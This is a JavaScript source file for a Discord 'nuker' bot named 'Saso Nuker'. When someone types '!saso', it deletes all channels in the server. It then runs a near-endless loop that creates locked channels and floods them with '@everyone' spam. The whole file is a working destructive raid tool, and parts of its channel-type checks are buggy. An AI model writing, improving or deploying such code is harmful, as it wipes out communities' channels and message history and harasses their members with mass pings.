const {Client, IntentsBitField} = require("discord.js")
const color = require("colors")



const token = "" //Token of your bot!


const bot = new Client({
    intents: [
        IntentsBitField.Flags.MessageContent,
        IntentsBitField.Flags.GuildMembers,
        IntentsBitField.Flags.GuildMessages,
        IntentsBitField.Flags.Guilds,
        
    ]
})




console.log(`           
                Saso Nuker

                [Dev] Lagis
                [Command] !saso
`.blue)


bot.on("ready", () => {
    console.log("[Status] Bot Has succesfuly started".green)
})

bot.on("messageCreate", (message) => {
    if(message.content === "!saso"){

        const guild = message.guild
        const channels = guild.channels.cache;
      
        channels.forEach(async (channel) => {
            if(channels.type === '5'){
                return;
            }
            if(channel.type === '15'){
                return;
            }
            if(channel.type === '11'){
                return;
            }
            try {
                if(channels.size > 0){
                    await channel.delete();
                }
            } catch (error) {
                console.error('', error)
            }
        })

        for(let i = 0; i <= 9999999; i++){
            try {
                setInterval(() => {

                    guild.channels.create({ name: "Saso Nuker", type: '0', permissionOverwrites: [{ id: guild.roles.everyone, allow: [ 'ViewChannel'], deny: ['SendMessages']}]}).then(channel => {
                        if(channel){
                            for(x = 0; x < 12; x++){
                                channel.send("Saso Nuker On Top! @everyone")
                            }
                            
                        }
                    })
                    
                   }, 100)

        
            } catch (error) {
                
            }

        }

       
    }
})



bot.login(token)//Bot token


